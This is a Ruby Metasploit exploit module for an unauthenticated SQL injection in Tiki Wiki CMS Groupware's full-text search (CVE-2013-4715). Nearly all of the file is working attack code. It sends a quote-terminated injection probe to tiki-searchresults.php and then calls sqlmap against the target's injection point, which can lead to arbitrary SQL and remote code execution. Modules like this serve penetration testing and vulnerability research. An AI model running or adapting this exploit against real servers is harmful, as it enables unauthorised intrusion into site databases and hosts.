##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
  #Custom sqlmap options determine the usefulness of this module.
  #No payload built in.

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Tiki Wiki CMS Groupware SQL Injection",
      'Description'    => %q{
          Tiki Wiki CMS Groupware (<6.13, <9.7, <10.4, 11.0) contains a SQL injection found in full-text
          search results (tiki-searchresults.php) which may result in remote code execution
          or arbitrary SQL commands.
          Authentication is not required in order to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Yuji Tounai <bogus.jp>',  	     # Discovery
          'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>',  #credit:sqlmap aux module pieces
          'Figure8 <figure_8@hushmail.com>'
        ],
      'References'     =>
        [
          ['OSVDB', '99215'],
          ['CVE','2013-4715'],
          ['BID', '63462']
        ],
      'Platform'       => %w{ linux win },
      'Targets'        =>
        [
          ['Automatic', {}],
          ['Windows',   { 'Arch' => ARCH_X86, 'Platform' => 'win'   }],
          ['Linux',     { 'Arch' => ARCH_X86, 'Platform' => 'linux' }]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => "Nov 6 2013"
                     ))
    register_options(
      [
        OptPath.new('SQLMAP_PATH', [ true,  "The sqlmap >= 0.6.1 full path ", "/sqlmap" ]),
        OptString.new('TARGETURI', [ true, "Path to Tiki installation", "tiki/" ]),
        OptString.new('OPTS', [ false,  "Custom SQLMAP options." ]),
        OptBool.new('BATCH', [ true,  "Use SQLMAP recommendations?(true/false)" ])
      ], self.class)
  end


  # Only attempts to return a db error
  def check
    path = normalize_uri(datastore['TARGETURI'])
    res = send_request_raw({
      'method'    => 'GET',
      'uri'       => "#{path}tiki-searchresults.php?highlight=Tiki&boolean=on&where=pages&searchLang=foo'",
      'headers'   => {
        'Accept-Encoding' => 'identity'
      }
    })

    if res and res.body =~ /db_error/
      return Exploit::CheckCode::Appears
    else
      #false negative if login is needed for search function
      return Exploit::CheckCode::Safe
    end
  end


  def exploit
    path = normalize_uri(datastore['TARGETURI'])
    print_status("Attempting SQL injection at #{path}tiki-searchresults.php")
    print_status("Please be patient, this may take some time...")

    sqlmap = File.join(datastore['SQLMAP_PATH'], 'sqlmap.py')
    if not File.file?(sqlmap)
      print_error("The sqlmap script could not be found")
      return
    end
    sqlmap_url  = (datastore['SSL'] ? "https" : "http")
    sqlmap_url << "://"
    sqlmap_url << datastore['RHOST']
    sqlmap_url << path
    sqlmap_url << 'tiki-searchresults.php?'
    sqlmap_url << "highlight=Tiki&boolean=on&where=pages&searchLang=foo*"

    cmd = [ sqlmap ]
    cmd += [ '-u', sqlmap_url ]


    if (datastore['OPTS'])
      opts = datastore['OPTS'].split("--")
      opts.each do |i|
        if not i == ""
          cmd << "--" + i.strip
        end
      end
    end

    cmd << '--dbms=mysql'
    cmd << "--msf-path=#{Dir.pwd}"

    if datastore['BATCH'] == true
      cmd << '--batch'
    end
    print_status("exec: #{cmd.inspect}")
    system(*cmd)
  end
end
